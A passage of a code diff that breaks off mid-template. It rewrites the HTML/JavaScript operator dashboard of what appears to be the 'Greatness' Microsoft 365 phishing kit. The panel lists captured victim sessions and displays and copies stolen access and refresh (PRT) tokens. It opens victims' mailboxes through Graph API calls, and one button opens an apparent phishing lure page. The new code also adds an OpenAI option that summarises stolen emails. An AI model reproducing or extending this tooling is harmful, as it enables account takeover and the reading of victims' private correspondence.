@@ -6,180 +6,828 @@
     <title>Greatness Admin - Session Manager</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', sans-serif; background: #0a0e27; color: #e0e0e0; padding: 20px; }
-        .container { max-width: 1400px; margin: 0 auto; }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid #1e2342; }
-        .logo h1 { background: linear-gradient(135deg, #6c63ff, #3b82f6); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
-        .stat-card { background: #111635; border-radius: 16px; padding: 20px; border: 1px solid #1e2342; }
-        .stat-title { font-size: 13px; color: #8b8fbf; margin-bottom: 8px; }
-        .stat-value { font-size: 28px; font-weight: 700; }
-        .tools-section { background: #111635; border-radius: 16px; padding: 20px; margin-bottom: 30px; }
-        .tools-grid { display: flex; gap: 15px; flex-wrap: wrap; }
-        .tool-btn { background: #1a1f3e; border: 1px solid #2a2f4e; padding: 10px 20px; border-radius: 10px; color: white; cursor: pointer; }
-        .tool-btn:hover { background: #3b82f6; }
-        .table-container { background: #111635; border-radius: 16px; padding: 20px; overflow-x: auto; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0a0e27;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+        
+        /* Header */
+        .header {
+            background: #111827;
+            border-bottom: 1px solid #1e293b;
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .logo h1 {
+            font-size: 20px;
+            background: linear-gradient(135deg, #667eea, #3b82f6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .logo p { font-size: 11px; color: #6b7280; }
+        .stats-badge {
+            display: flex;
+            gap: 20px;
+        }
+        .stat {
+            text-align: center;
+        }
+        .stat-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: #60a5fa;
+        }
+        .stat-label {
+            font-size: 10px;
+            color: #6b7280;
+        }
+        
+        /* Main Layout */
+        .main {
+            display: flex;
+            min-height: calc(100vh - 100px);
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            width: 260px;
+            background: #0f172a;
+            border-right: 1px solid #1e293b;
+            padding: 20px 0;
+        }
+        .nav-item {
+            padding: 12px 20px;
+            margin: 4px 12px;
+            border-radius: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.2s;
+            color: #9ca3af;
+        }
+        .nav-item:hover { background: #1e293b; color: white; }
+        .nav-item.active { background: #3b82f6; color: white; }
+        
+        /* Content */
+        .content {
+            flex: 1;
+            padding: 24px;
+            overflow-y: auto;
+        }
+        
+        /* Cards */
+        .card {
+            background: #111827;
+            border-radius: 16px;
+            border: 1px solid #1e293b;
+            margin-bottom: 24px;
+            overflow: hidden;
+        }
+        .card-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid #1e293b;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .card-title { font-size: 16px; font-weight: 600; }
+        .card-body { padding: 20px; }
+        
+        /* Tables */
+        .table-wrapper { overflow-x: auto; }
         table { width: 100%; border-collapse: collapse; }
-        th, td { text-align: left; padding: 12px 8px; border-bottom: 1px solid #1e2342; }
-        th { color: #8b8fbf; font-size: 12px; }
-        td { font-size: 12px; }
-        .btn-view { background: #10b981; border: none; padding: 6px 12px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; margin: 2px; }
-        .btn-mail { background: #8b5cf6; }
-        .token-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111635; border-radius: 16px; padding: 24px; width: 700px; max-width: 90%; z-index: 1000; border: 1px solid #3b82f6; max-height: 80vh; overflow-y: auto; }
-        .token-modal pre { background: #0a0e27; padding: 12px; border-radius: 8px; overflow-x: auto; font-size: 10px; word-break: break-all; }
-        .overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 999; }
-        .loading { text-align: center; padding: 40px; }
-        .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #374151; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        th, td { text-align: left; padding: 12px 16px; border-bottom: 1px solid #1e293b; }
+        th { color: #8b8fbf; font-size: 12px; font-weight: 500; }
+        td { font-size: 13px; }
+        
+        /* Buttons */
+        .btn {
+            padding: 6px 12px;
+            border-radius: 6px;
+            border: none;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        .btn-primary { background: #3b82f6; color: white; }
+        .btn-primary:hover { background: #2563eb; }
+        .btn-success { background: #10b981; color: white; }
+        .btn-success:hover { background: #059669; }
+        .btn-danger { background: #ef4444; color: white; }
+        .btn-danger:hover { background: #dc2626; }
+        .btn-outline { background: transparent; border: 1px solid #2d3748; color: #e0e0e0; }
+        .btn-outline:hover { background: #1e293b; }
+        
+        /* Form Elements */
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; margin-bottom: 6px; font-size: 12px; color: #9ca3af; }
+        .form-control {
+            width: 100%;
+            padding: 10px 12px;
+            background: #1e293b;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            color: white;
+            font-size: 13px;
+        }
+        .form-control:focus { outline: none; border-color: #3b82f6; }
+        
+        /* Grid */
+        .grid-2 { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
+        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
+        
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal.open { display: flex; }
+        .modal-content {
+            background: #111827;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .modal-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid #1e293b;
+            display: flex;
+            justify-content: space-between;
+        }
+        .modal-body { padding: 20px; }
+        .modal-footer { padding: 16px 20px; border-top: 1px solid #1e293b; display: flex; justify-content: flex-end; gap: 10px; }
+        
+        /* Mailbox specific */
+        .mail-container {
+            display: flex;
+            height: calc(100vh - 120px);
+        }
+        .mail-folders {
+            width: 260px;
+            background: #0f172a;
+            border-radius: 12px;
+            overflow-y: auto;
+        }
+        .folder-item {
+            padding: 10px 16px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            border-radius: 8px;
+            margin: 4px 8px;
+        }
+        .folder-item:hover { background: #1e293b; }
+        .folder-item.active { background: #3b82f6; }
+        .mail-list {
+            flex: 1;
+            margin-left: 20px;
+            background: #0f172a;
+            border-radius: 12px;
+            overflow-y: auto;
+        }
+        .email-item {
+            padding: 16px;
+            border-bottom: 1px solid #1e293b;
+            cursor: pointer;
+        }
+        .email-item:hover { background: #1e293b; }
+        .email-item.unread { background: #1e293b; border-left: 3px solid #3b82f6; }
+        .email-subject { font-weight: 600; margin-bottom: 4px; }
+        .email-from { font-size: 12px; color: #9ca3af; }
+        .email-preview { font-size: 11px; color: #6b7280; margin-top: 4px; }
+        
+        .loading { text-align: center; padding: 40px; color: #6b7280; }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #374151;
+            border-top-color: #3b82f6;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .copy-token { font-size: 10px; background: #2563eb; border: none; padding: 2px 8px; border-radius: 4px; color: white; cursor: pointer; margin-left: 8px; }
+        
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 500;
+        }
+        .badge-success { background: #10b981; color: white; }
+        .badge-warning { background: #f59e0b; color: #1a1a1a; }
+        
+        .view { display: none; }
+        .view.active { display: block; }
+        
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #1e293b; }
+        ::-webkit-scrollbar-thumb { background: #374151; border-radius: 3px; }
     </style>
 </head>
 <body>
-<div class="container">
     <div class="header">
-        <div class="logo"><h1>Greatness Admin</h1><p>Session & Token Manager</p></div>
-        <div class="stat-value" id="sessionCount" style="font-size: 14px;">0 Sessions</div>
-    </div>
-
-    <div class="stats-grid">
-        <div class="stat-card"><div class="stat-title">Total Sessions</div><div class="stat-value" id="totalSessions">0</div></div>
-        <div class="stat-card"><div class="stat-title">With PRT</div><div class="stat-value" id="withPRT">0</div></div>
-        <div class="stat-card"><div class="stat-title">Total Users</div><div class="stat-value" id="totalUsers">0</div></div>
-        <div class="stat-card"><div class="stat-title">Last Capture</div><div class="stat-value" id="lastCapture" style="font-size: 14px;">-</div></div>
-    </div>
-
-    <div class="tools-section">
-        <div class="tools-grid">
-            <button class="tool-btn" id="refreshBtn">🔄 Refresh</button>
-            <button class="tool-btn" id="clearBtn">🗑️ Clear All</button>
-            <button class="tool-btn" id="addAccountBtn">➕ Add Account</button>
+        <div class="logo">
+            <h1>Greatness Admin</h1>
+            <p>Microsoft 365 Session Manager</p>
+        </div>
+        <div class="stats-badge">
+            <div class="stat">
+                <div class="stat-value" id="statSessions">0</div>
+                <div class="stat-label">Sessions</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="statPRT">0</div>
+                <div class="stat-label">PRT Tokens</div>
+            </div>
         </div>
     </div>
-
-    <div class="table-container">
-        <h3>📋 Captured Sessions</h3>
-        <table>
-            <thead><tr><th>Email</th><th>IP Address</th><th>User Agent</th><th>PRT</th><th>Captured</th><th>Actions</th></tr></thead>
-            <tbody id="sessionsTableBody"><tr><td colspan="6" class="loading"><div class="spinner"></div> Loading...   </div>... </div>?... </div>?... </div>?..</td></tr></tbody>
-        </table>
+    
+    <div class="main">
+        <div class="sidebar">
+            <div class="nav-item active" data-view="dashboard">
+                <span>📊</span> Dashboard
+            </div>
+            <div class="nav-item" data-view="sessions">
+                <span>📋</span> Sessions
+            </div>
+            <div class="nav-item" data-view="tokens">
+                <span>🔑</span> Tokens
+            </div>
+            <div class="nav-item" data-view="mailbox">
+                <span>📧</span> Mailbox
+            </div>
+            <div class="nav-item" data-view="settings">
+                <span>⚙️</span> Settings
+            </div>
+        </div>
+        
+        <div class="content">
+            <!-- Dashboard View -->
+            <div id="dashboardView" class="view active">
+                <div class="grid-3">
+                    <div class="card">
+                        <div class="card-header"><span class="card-title">Total Sessions</span></div>
+                        <div class="card-body"><div class="stat-value" style="font-size: 36px;" id="totalSessions">0</div></div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header"><span class="card-title">Active PRTs</span></div>
+                        <div class="card-body"><div class="stat-value" style="font-size: 36px;" id="totalPRTs">0</div></div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header"><span class="card-title">Last Capture</span></div>
+                        <div class="card-body"><div class="stat-value" style="font-size: 14px;" id="lastCapture">-</div></div>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Recent Sessions</span>
+                        <button class="btn btn-outline" onclick="loadDashboard()">Refresh</button>
+                    </div>
+                    <div class="table-wrapper">
+                        <table id="recentTable">
+                            <thead><tr><th>Email</th><th>Name</th><th>Type</th><th>Captured</th></tr></thead>
+                            <tbody id="recentBody"><tr><td colspan="4" class="loading">Loading...</td></tr></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Sessions View -->
+            <div id="sessionsView" class="view">
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">All Captured Sessions</span>
+                        <button class="btn btn-danger" onclick="clearAllSessions()">Clear All</button>
+                    </div>
+                    <div class="table-wrapper">
+                        <table id="sessionsTable">
+                            <thead><tr><th>ID</th><th>Email</th><th>Name</th><th>Type</th><th>Captured</th><th>Expires</th><th>Action</th></tr></thead>
+                            <tbody id="sessionsBody"><tr><td colspan="7" class="loading">Loading...</td></tr></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Tokens View -->
+            <div id="tokensView" class="view">
+                <div class="grid-2">
+                    <div class="card">
+                        <div class="card-header"><span class="card-title">Access Tokens</span></div>
+                        <div class="table-wrapper">
+                            <table id="accessTokensTable">
+                                <thead><tr><th>User</th><th>Resource</th><th>Issued</th><th>Expires</th><th>Action</th></tr></thead>
+                                <tbody id="accessTokensBody"><tr><td colspan="5" class="loading">Loading...</td></tr></tbody>
+                            </table>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header"><span class="card-title">Refresh Tokens (PRT)</span></div>
+                        <div class="table-wrapper">
+                            <table id="refreshTokensTable">
+                                <thead><tr><th>User</th><th>Resource</th><th>Action</th></tr></thead>
+                                <tbody id="refreshTokensBody"><tr><td colspan="3" class="loading">Loading...</td></tr></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Mailbox View -->
+            <div id="mailboxView" class="view">
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Select a session to open mailbox</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="grid-2">
+                            <div>
+                                <label>Select User Session</label>
+                                <select id="mailboxUserSelect" class="form-control" style="margin-top: 8px;">
+                                    <option value="">Select a user...</option>
+                                </select>
+                                <button class="btn btn-primary" style="margin-top: 12px;" onclick="openMailbox()">📧 Open Mailbox</button>
+                            </div>
+                            <div id="mailboxInfo"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Settings View -->
+            <div id="settingsView" class="view">
+                <div class="grid-2">
+                    <div class="card">
+                        <div class="card-header"><span class="card-title">Resource Selector</span></div>
+                        <div class="card-body">
+                            <div class="form-group">
+                                <label>Active Resource</label>
+                                <select id="activeResource" class="form-control">
+                                    <option value="graph">Graph API (Outlook/OneDrive)</option>
+                                    <option value="prt">PRT Token (Device Registration)</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label>API Version</label>
+                                <select id="apiVersion" class="form-control">
+                                    <option value="1">v1 (resource parameter)</option>
+                                    <option value="2">v2 (scope parameter)</option>
+                                </select>
+                            </div>
+                            <button class="btn btn-primary" onclick="saveResourceSettings()">Save Settings</button>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header"><span class="card-title">🤖 OpenAI Integration</span></div>
+                        <div class="card-body">
+                            <div class="form-group">
+                                <label>Enable AI Features</label>
+                                <select id="openaiEnabled" class="form-control">
+                                    <option value="false">Disabled</option>
+                                    <option value="true">Enabled</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label>API Key</label>
+                                <input type="password" id="openaiApiKey" class="form-control" placeholder="sk-...">
+                            </div>
+                            <div class="form-group">
+                                <label>Model</label>
+                                <select id="openaiModel" class="form-control">
+                                    <option value="gpt-3.5-turbo">GPT-3.5 Turbo (Fast & Cheap)</option>
+                                    <option value="gpt-4">GPT-4 (Powerful)</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label>Max Tokens</label>
+                                <input type="number" id="openaiMaxTokens" class="form-control" value="500">
+                            </div>
+                            <div class="form-group">
+                                <label>Temperature</label>
+                                <input type="range" id="openaiTemperature" min="0" max="2" step="0.1" value="0.7">
+                                <span id="tempValue">0.7</span>
+                            </div>
+                            <button class="btn btn-primary" onclick="saveOpenAISettings()">Save OpenAI Settings</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
-</div>
-
-<div class="overlay" id="overlay"></div>
-<div class="token-modal" id="tokenModal">
-    <h3 id="modalTitle">Token Details</h3>
-    <div id="tokenDetails"></div>
-    <button class="tool-btn" onclick="closeModal()" style="margin-top: 15px; background:#ef4444;">Close</button>
-</div>
-
-<script>
-    async function apiCall(endpoint, options = {}) {
-        try {
-            const response = await fetch(endpoint, { ...options, headers: { 'Content-Type': 'application/json' } });
-            if (!response.ok) throw new Error(`HTTP ${response.status}`);
-            return await response.json();
-        } catch (err) { return null; }
-    }
-
-    async function loadSessions() {
-        const data = await apiCall('/api/sessions');
-        if (data && data.sessions) {
-            renderTable(data.sessions);
-            updateStats(data.sessions);
-            document.getElementById('sessionCount').innerHTML = `${data.sessions.length} Sessions`;
+    
+    <!-- Mailbox Modal -->
+    <div id="mailboxModal" class="modal">
+        <div class="modal-content" style="max-width: 95%; width: 95%; height: 85vh; max-height: 85vh;">
+            <div class="modal-header">
+                <h3 id="mailboxTitle">Mailbox</h3>
+                <button class="btn btn-outline" onclick="closeMailboxModal()">✕</button>
+            </div>
+            <div class="modal-body" style="padding: 0; height: calc(100% - 60px);">
+                <div class="mail-container" id="mailboxContainer">
+                    <div class="loading">Loading mailbox...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const API_BASE = '';
+        
+        // ============================================
+        // Helper Functions
+        // ============================================
+        async function apiCall(endpoint, options = {}) {
+            try {
+                const response = await fetch(endpoint, {
+                    ...options,
+                    headers: { 'Content-Type': 'application/json', ...options.headers }
+                });
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                return await response.json();
+            } catch (err) {
+                console.error('API call failed:', err);
+                return null;
+            }
         }
-    }
-
-    function renderTable(sessions) {
-        const tbody = document.getElementById('sessionsTableBody');
-        if (!sessions || sessions.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No sessions. Click "Add Account" to authenticate.   </div>   </div>   </div>   </div>   </div>   </td></tr>';
-            return;
+        
+        function formatDate(dateStr) {
+            if (!dateStr) return 'Unknown';
+            return new Date(dateStr).toLocaleString();
         }
         
-        tbody.innerHTML = sessions.map(s => `
-            <tr>
-                <td style="color:#60a5fa;">${escapeHtml(s.email)}</td>
-                <td><code>${escapeHtml(s.ip || 'Unknown')}</code></td>
-                <td style="max-width:200px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="${escapeHtml(s.userAgent)}">${escapeHtml((s.userAgent || 'Unknown').substring(0, 40))}...</td>
-                <td>${s.hasPRT ? '<span style="color:#10b981;">✅ PRT Captured</span>' : '<span style="color:#ef4444;">❌ No PRT</span>'}</td>
-                <td>${formatDate(s.capturedAt)}</td>
-                <td>
-                    <button class="btn-view" onclick="viewTokens('${s.sessionId}')">🔑 View Tokens</button>
-                    <button class="btn-view btn-mail" onclick="openMailbox('${s.sessionId}', '${escapeHtml(s.email)}')">📧 Open Mailbox</button>
-                 </td>
-            </tr>
-        `).join('');
-    }
-
-    async function viewTokens(sessionId) {
-        document.getElementById('tokenModal').style.display = 'block';
-        document.getElementById('overlay').style.display = 'block';
-        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Loading tokens...</div>';
+        function escapeHtml(str) {
+            if (!str) return '';
+            return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]);
+        }
         
-        const data = await apiCall(`/api/session/tokens/${sessionId}`);
+        // ============================================
+        // Navigation
+        // ============================================
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.addEventListener('click', () => {
+                const view = item.dataset.view;
+                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+                item.classList.add('active');
+                document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+                document.getElementById(`${view}View`).classList.add('active');
+                
+                if (view === 'dashboard') loadDashboard();
+                if (view === 'sessions') loadSessions();
+                if (view === 'tokens') loadTokens();
+                if (view === 'mailbox') loadMailboxSelect();
+                if (view === 'settings') loadSettings();
+            });
+        });
         
-        if (data) {
-            document.getElementById('modalTitle').innerHTML = `🔐 Tokens - ${data.email}`;
-            document.getElementById('tokenDetails').innerHTML = `
-                <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
-                <p><strong>Access Token (valid for ${data.expires_in} sec):</strong></p>
-                <pre id="accessToken">${escapeHtml(data.access_token)}</pre>
-                <button class="copy-token" onclick="copyToken('accessToken')">📋 Copy Access Token</button>
-                <p style="margin-top: 15px;"><strong>PRT (Refresh Token):</strong></p>
-                <pre id="prtToken">${escapeHtml(data.refresh_token || 'Not captured')}</pre>
-                <button class="copy-token" onclick="copyToken('prtToken')">📋 Copy PRT</button>
-                <p style="font-size: 11px; color: #f59e0b; margin-top: 15px;">⚠️ These tokens can be used to access the user's mailbox directly</p>
-                <p style="font-size: 11px; color: #10b981;">✅ Use the Access Token with Bearer authorization to call Microsoft Graph API</p>
+        // ============================================
+        // Dashboard
+        // ============================================
+        async function loadDashboard() {
+            const sessions = await apiCall('/api/sessions');
+            if (sessions && sessions.sessions) {
+                document.getElementById('totalSessions').innerHTML = sessions.total || sessions.sessions.length;
+                document.getElementById('statSessions').innerHTML = sessions.sessions.length;
+                
+                const recent = sessions.sessions.slice(0, 5);
+                document.getElementById('recentBody').innerHTML = recent.map(s => `
+                    <tr><td>${escapeHtml(s.email)}</td><td>${escapeHtml(s.name || '-')}</td><td>${escapeHtml(s.type || 'Graph API')}</td><td>${formatDate(s.capturedAt)}</td></tr>
+                `).join('');
+                
+                if (recent.length) {
+                    document.getElementById('lastCapture').innerHTML = formatDate(recent[0].capturedAt);
+                }
+            }
+            
+            const tokens = await apiCall('/api/list_refresh_tokens');
+            if (tokens) {
+                document.getElementById('totalPRTs').innerHTML = tokens.length;
+                document.getElementById('statPRT').innerHTML = tokens.length;
+            }
+        }
+        
+        // ============================================
+        // Sessions
+        // ============================================
+        async function loadSessions() {
+            const data = await apiCall('/api/sessions');
+            if (data && data.sessions) {
+                document.getElementById('sessionsBody').innerHTML = data.sessions.map(s => `
+                    <tr>
+                        <td>${s.id}</td>
+                        <td style="color:#60a5fa;">${escapeHtml(s.email)}</td>
+                        <td>${escapeHtml(s.name || '-')}</td>
+                        <td><span class="badge badge-success">${escapeHtml(s.type || 'Graph API')}</span></td>
+                        <td>${formatDate(s.capturedAt)}</td>
+                        <td>${formatDate(s.expiresAt)}</td>
+                        <td><button class="btn btn-outline" style="padding: 4px 8px;" onclick="openMailboxForUser('${escapeHtml(s.email)}')">📧 Open Mailbox</button></td>
+                    </tr>
+                `).join('');
+            }
+        }
+        
+        async function clearAllSessions() {
+            if (confirm('⚠️ Clear all sessions? This will delete ALL tokens.')) {
+                await apiCall('/api/sessions/clear', { method: 'DELETE' });
+                loadDashboard();
+                loadSessions();
+                loadTokens();
+            }
+        }
+        
+        // ============================================
+        // Tokens
+        // ============================================
+        async function loadTokens() {
+            const accessTokens = await apiCall('/api/list_access_tokens');
+            if (accessTokens) {
+                document.getElementById('accessTokensBody').innerHTML = accessTokens.map(t => `
+                    <tr>
+                        <td>${escapeHtml(t.user)}</td>
+                        <td>${escapeHtml(t.resource)}</td>
+                        <td>${formatDate(t.issued_at)}</td>
+                        <td>${formatDate(t.expires_at)}</td>
+                        <td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.accesstoken)}')">Copy</button></td>
+                    </tr>
+                `).join('');
+            }
+            
+            const refreshTokens = await apiCall('/api/list_refresh_tokens');
+            if (refreshTokens) {
+                document.getElementById('refreshTokensBody').innerHTML = refreshTokens.map(t => `
+                    <tr>
+                        <td>${escapeHtml(t.user)}</td>
+                        <td>${escapeHtml(t.resource)}</td>
+                        <td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.refreshtoken)}')">Copy PRT</button></td>
+                    </tr>
+                `).join('');
+            }
+        }
+        
+        function copyToken(token) {
+            navigator.clipboard.writeText(token);
+            alert('Token copied to clipboard!');
+        }
+        
+        // ============================================
+        // Mailbox
+        // ============================================
+        async function loadMailboxSelect() {
+            const sessions = await apiCall('/api/sessions');
+            const select = document.getElementById('mailboxUserSelect');
+            
+            if (sessions && sessions.sessions) {
+                select.innerHTML = '<option value="">Select a user...</option>' + 
+                    sessions.sessions.map(s => `<option value="${escapeHtml(s.email)}">${escapeHtml(s.email)} (${escapeHtml(s.name || 'No name')})</option>`).join('');
+            }
+        }
+        
+        async function openMailbox() {
+            const select = document.getElementById('mailboxUserSelect');
+            const email = select.value;
+            if (!email) {
+                alert('Please select a user');
+                return;
+            }
+            await openMailboxForUser(email);
+        }
+        
+        async function openMailboxForUser(email) {
+            document.getElementById('mailboxTitle').innerHTML = `📧 Mailbox - ${email}`;
+            document.getElementById('mailboxModal').classList.add('open');
+            document.getElementById('mailboxContainer').innerHTML = '<div class="loading"><div class="spinner"></div> Loading folders...</div>';
+            
+            await loadMailboxFolders(email);
+        }
+        
+        async function loadMailboxFolders(email) {
+            try {
+                const response = await fetch(`${API_BASE}/api/mail/folders/${encodeURIComponent(email)}`);
+                const data = await response.json();
+                
+                if (data.error) {
+                    document.getElementById('mailboxContainer').innerHTML = `<div class="loading">❌ ${data.error}</div>`;
+                    return;
+                }
+                
+                const folders = data.value || [];
+                renderMailbox(email, folders);
+            } catch (err) {
+                document.getElementById('mailboxContainer').innerHTML = `<div class="loading">❌ Failed to load folders: ${err.message}</div>`;
+            }
+        }
+        
+        let currentMailboxEmail = null;
+        let currentFolderId = 'inbox';
+        let currentEmails = [];
+        
+        async function renderMailbox(email, folders) {
+            currentMailboxEmail = email;
+            
+            const container = document.getElementById('mailboxContainer');
+            container.innerHTML = `
+                <div class="mail-folders" id="mailFolders">
+                    ${folders.map(f => `
+                        <div class="folder-item ${f.id === 'inbox' ? 'active' : ''}" onclick="loadFolderEmails('${email}', '${f.id}')">
+                            <span>📁 ${f.displayName}</span>
+                            <span class="badge">${f.unreadItemCount || 0}</span>
+                        </div>
+                    `).join('')}
+                </div>
+                <div class="mail-list" id="mailList">
+                    <div class="loading"><div class="spinner"></div> Select a folder</div>
+                </div>
             `;
+            
+            // Load inbox by default
+            loadFolderEmails(email, 'inbox');
         }
-    }
-
-    function copyToken(elementId) {
-        const element = document.getElementById(elementId);
-        const text = element.innerText;
-        navigator.clipboard.writeText(text);
-        alert('✓ Token copied to clipboard!');
-    }
-
-    function openMailbox(sessionId, email) {
-        window.open(`/mailbox.html?sid=${sessionId}&email=${encodeURIComponent(email)}`, '_blank', 'width=1200,height=800');
-    }
-
-    function updateStats(sessions) {
-        document.getElementById('totalSessions').innerText = sessions.length;
-        const withPRT = sessions.filter(s => s.hasPRT).length;
-        document.getElementById('withPRT').innerText = withPRT;
-        document.getElementById('totalUsers').innerText = sessions.length;
-        if (sessions.length > 0) document.getElementById('lastCapture').innerHTML = formatDate(sessions[0].capturedAt);
-    }
-
-    function closeModal() {
-        document.getElementById('tokenModal').style.display = 'none';
-        document.getElementById('overlay').style.display = 'none';
-    }
-
-    function openAddAccount() { 
-        window.open('/meeting.html', '_blank', 'width=800,height=900');
-        setTimeout(loadSessions, 5000);
-    }
-    
-    async function clearAll() { 
-        if(confirm('Clear all sessions?')){ 
-            await apiCall('/api/sessions/clear',{method:'DELETE'}); 
-            loadSessions(); 
-        } 
-    }
-    
-    function formatDate(d){ return d ? new Date(d).toLocaleString() : 'Unknown'; }
-    function escapeHtml(str){ if(!str) return ''; return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }
-
-    document.getElementById('refreshBtn').onclick = loadSessions;
-    document.getElementById('clearBtn').onclick = clearAll;
-    document.getElementById('addAccountBtn').onclick = openAddAccount;
-    
-    setInterval(loadSessions, 5000);
-    loadSessions();
-</script>
+        
+        async function loadFolderEmails(email, folderId) {
+            currentFolderId = folderId;
+            
+            document.getElementById('mailList').innerHTML = '<div class="loading"><div class="spinner"></div> Loading emails...</div>';
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/mail/${encodeURIComponent(email)}/${folderId}`);
+                const data = await response.json();
+                
+                if (data.error) {
+                    document.getElementById('mailList').innerHTML = `<div class="loading">❌ ${data.error}</div>`;
+                    return;
+                }
+                
+                currentEmails = data.value || [];
+                renderEmailList(currentEmails);
+            } catch (err) {
+                document.getElementById('mailList').innerHTML = `<div class="loading">❌ ${err.message}</div>`;
+            }
+        }
+        
+        function renderEmailList(emails) {
+            if (!emails || emails.length === 0) {
+                document.getElementById('mailList').innerHTML = '<div class="loading">📭 No emails in this folder</div>';
+                return;
+            }
+            
+            document.getElementById('mailList').innerHTML = emails.map(email => `
+                <div class="email-item ${!email.isRead ? 'unread' : ''}" onclick="loadFullEmail('${email.id}')">
+                    <div class="email-subject">
+                        ${escapeHtml(email.subject || '(No subject)')}
+                        ${email.hasAttachments ? ' 📎' : ''}
+                    </div>
+                    <div class="email-from">${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}</div>
+                    <div class="email-preview">${escapeHtml(email.bodyPreview || '')}</div>
+                </div>
+            `).join('');
+            
+            // Add AI summary button if OpenAI is enabled
+            if (document.getElementById('openaiEnabled')?.value === 'true') {
+                const summaryBtn = document.createElement('button');
+                summaryBtn.className = 'btn btn-outline';
+                summaryBtn.style.margin = '10px';
+                summaryBtn.innerHTML = '🤖 AI Summary';
+                summaryBtn.onclick = () => generateAIEmailSummary(emails);
+                document.getElementById('mailList').prepend(summaryBtn);
+            }
+        }
+        
+        async function loadFullEmail(messageId) {
+            const modal = document.createElement('div');
+            modal.style.cssText = 'position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.9); z-index:2000; display:flex; align-items:center; justify-content:center;';
+            modal.innerHTML = '<div class="loading"><div class="spinner"></div> Loading message...</div>';
+            document.body.appendChild(modal);
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/mail/message/${encodeURIComponent(currentMailboxEmail)}/${messageId}`);
+                const email = await response.json();
+                
+                modal.innerHTML = `
+                    <div style="background:#111827; border-radius:16px; width:90%; max-width:800px; max-height:80vh; overflow:auto;">
